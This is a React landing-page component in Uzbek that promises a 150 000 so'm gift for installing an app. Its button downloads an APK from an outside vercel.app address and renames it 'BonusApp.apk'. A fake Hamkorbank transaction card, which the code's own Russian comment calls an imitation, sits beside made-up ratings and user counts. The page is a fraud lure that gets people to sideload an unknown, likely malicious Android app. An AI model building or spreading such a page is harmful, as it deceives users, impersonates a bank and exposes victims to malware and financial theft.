import React from 'react';

export default function App() {
  const handleDownload = (e) => {
    e.preventDefault();
    const link = document.createElement('a');
    link.href = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
    link.download = 'BonusApp.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div
      style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%)',
        fontFamily: 'Segoe UI, system-ui, sans-serif',
        color: 'white',
        padding: '20px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        textAlign: 'center',
        position: 'relative',
        overflowX: 'hidden'
      }}
    >
      {/* Левая колонка */}
      <div style={{
        flex: '0 0 45%',
        textAlign: 'left',
        paddingRight: '40px',
        maxWidth: '500px'
      }}>
        {/* Метка "Maxsus taklif" */}
        <div style={{
          background: 'rgba(255,255,255,0.2)',
          color: 'white',
          padding: '6px 16px',
          borderRadius: '20px',
          fontSize: '0.85rem',
          display: 'inline-block',
          marginBottom: '20px',
          border: '1px solid rgba(255,255,255,0.3)'
        }}>
          🎁 Maxsus taklif
        </div>

        {/* Большая сумма */}
        <h1 style={{
          fontSize: '48px',
          fontWeight: '900',
          color: '#ffd700',
          lineHeight: 1.2,
          marginBottom: '10px'
        }}>
          150 000 so‘m
        </h1>
        <h2 style={{
          fontSize: '36px',
          fontWeight: '800',
          marginBottom: '20px',
          lineHeight: 1.3
        }}>
          sovg‘a olish!
        </h2>

        {/* Описание */}
        <p style={{
          fontSize: '16px',
          marginBottom: '30px',
          lineHeight: 1.5,
          color: 'rgba(255,255,255,0.9)'
        }}>
          Ilovani yuklab oling va ro‘yxatdan o‘ting — darhol <span style={{ color: '#ffd700' }}>150 000 so‘m</span> kartangizga sovg‘a sifatida tushadi. Faqat yangi foydalanuvchilar uchun!
        </p>

        {/* Список преимуществ */}
        <div style={{
          marginBottom: '30px'
        }}>
          {[
            {
              icon: '📱',
              title: 'Ilovani yuklab oling',
              subtitle: 'Android yoki iOS'
            },
            {
              icon: '✅',
              title: 'Ro‘yxatdan o‘ting',
              subtitle: 'Faqat telefon raqamingiz kerak'
            },
            {
              icon: '🎁',
              title: '150 000 so‘m oling!',
              subtitle: 'Avtomatik kartangizga'
            }
          ].map((item, i) => (
            <div key={i} style={{
              display: 'flex',
              alignItems: 'flex-start',
              gap: '12px',
              marginBottom: '16px',
              padding: '12px',
              borderRadius: '12px',
              background: 'rgba(255,255,255,0.1)',
              transition: 'background 0.2s'
            }} onMouseOver={(e) => {
              e.target.style.background = 'rgba(255,255,255,0.15)';
            }} onMouseOut={(e) => {
              e.target.style.background = 'rgba(255,255,255,0.1)';
            }}>
              <div style={{
                width: '40px',
                height: '40px',
                borderRadius: '50%',
                background: '#ffeb3b',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#000',
                fontWeight: 'bold',
                fontSize: '18px'
              }}>
                {item.icon}
              </div>
              <div>
                <div style={{ fontWeight: '700', fontSize: '16px' }}>{item.title}</div>
                <div style={{ fontSize: '14px', color: 'rgba(255,255,255,0.8)' }}>{item.subtitle}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Кнопка */}
        <button
          onClick={handleDownload}
          style={{
            background: 'linear-gradient(to right, #ffc107, #ff9800)',
            color: '#000',
            border: 'none',
            padding: '16px 36px',
            fontSize: '20px',
            fontWeight: 'bold',
            borderRadius: '40px',
            cursor: 'pointer',
            boxShadow: '0 6px 20px rgba(0,0,0,0.2)',
            transition: 'all 0.3s',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '10px',
            width: '100%'
          }}
          onMouseOver={(e) => {
            e.target.style.transform = 'scale(1.03)';
            e.target.style.boxShadow = '0 8px 25px rgba(0,0,0,0.3)';
          }}
          onMouseOut={(e) => {
            e.target.style.transform = 'scale(1)';
            e.target.style.boxShadow = '0 6px 20px rgba(0,0,0,0.2)';
          }}
        >
          🎁 Sovg‘ani olish →
        </button>

        {/* Рейтинг */}
        <div style={{
          marginTop: '20px',
          fontSize: '14px',
          color: 'rgba(255,255,255,0.8)',
          display: 'flex',
          alignItems: 'center',
          gap: '6px'
        }}>
          <span>⭐ 4.9/5</span>
          <span>•</span>
          <span>46,000+ foydalanuvchi sovg‘a oldi</span>
        </div>
      </div>

      {/* Правая колонка — имитация транзакции */}
      <div style={{
        flex: '0 0 45%',
        background: 'white',
        color: '#000',
        borderRadius: '20px',
        padding: '30px',
        boxShadow: '0 10px 40px rgba(0,0,0,0.2)',
        textAlign: 'left',
        maxWidth: '400px'
      }}>
        {/* Заголовок банка */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          marginBottom: '20px'
        }}>
          <div style={{
            width: '50px',
            height: '50px',
            borderRadius: '12px',
            background: '#4caf50',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginRight: '12px'
          }}>
            <span style={{ color: 'white', fontSize: '24px', fontWeight: 'bold' }}>H</span>
          </div>
          <div>
            <div style={{ fontWeight: '700', fontSize: '18px' }}>Hamkorbank</div>
            <div style={{ fontSize: '14px', color: '#666' }}>Plastik karta</div>
          </div>
        </div>

        {/* Разделитель */}
        <div style={{
          borderTop: '1px dashed #ccc',
          margin: '20px 0'
        }}></div>

        {/* Детали транзакции */}
        <div style={{ marginBottom: '20px' }}>
          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Tranzaksiya</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
            <span>🎁</span>
            <span>Xush kelibsiz sovg‘asi</span>
          </div>
          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Sana va vaqt</div>
          <div>5-noyabr, 2025 • 14:23</div>
          <div style={{ fontSize: '14px', color: '#666', marginTop: '16px' }}>Karta raqami</div>
          <div>8600 **** **** 4521</div>
        </div>

        {/* Блок суммы */}
        <div style={{
          background: '#fff8e1',
          border: '2px solid #ffc107',
          borderRadius: '12px',
          padding: '20px',
          marginBottom: '20px',
          position: 'relative'
        }}>
          <div style={{
            position: 'absolute',
            top: '10px',
            right: '10px',
            fontSize: '24px',
            opacity: 0.2
          }}>🎁</div>
          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Sovg‘a olindi</div>
          <div style={{
            fontSize: '32px',
            fontWeight: '900',
            color: '#ff5722',
            marginBottom: '4px'
          }}>
            +150 000
          </div>
          <div style={{ fontSize: '16px', color: '#666' }}>so‘m</div>
        </div>

        {/* Статус */}
        <div style={{ marginBottom: '20px' }}>
          <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Status</div>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
            color: '#4caf50',
            fontWeight: '600'
          }}>
            <div style={{
              width: '10px',
              height: '10px',
              borderRadius: '50%',
              background: '#4caf50'
            }}></div>
            Muvaffaqiyatli
          </div>
        </div>

        {/* Разделитель */}
        <div style={{
          borderTop: '1px dashed #ccc',
          margin: '20px 0'
        }}></div>

        {/* Кнопка подтверждения */}
        <div style={{
          textAlign: 'center'
        }}>
          <button style={{
            background: '#e8f5e8',
            color: '#2e7d32',
            border: 'none',
            padding: '10px 20px',
            borderRadius: '30px',
            fontSize: '14px',
            fontWeight: '600',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px',
            transition: 'background 0.2s'
          }} onMouseOver={(e) => {
            e.target.style.background = '#c8e6c9';
          }} onMouseOut={(e) => {
            e.target.style.background = '#e8f5e8';
          }}>
            ✅ Tasdiqlangan
          </button>
        </div>

        {/* ID транзакции */}
        <div style={{
          marginTop: '16px',
          fontSize: '12px',
          color: '#999',
          textAlign: 'center'
        }}>
          ID: TXN-2025-1104-87392
        </div>
      </div>

      {/* Адаптивность */}
      <style>{`
        @media (max-width: 900px) {
          .App {
            flex-direction: column;
          }
          div[style*="flex: 0 0 45%"] {
            flex: 0 0 100%;
            max-width: none;
            padding: 0;
            margin-bottom: 30px;
          }
          h1 { font-size: 36px; }
          h2 { font-size: 30px; }
          button { width: 100%; }
        }
      `}</style>
    </div>
  );
}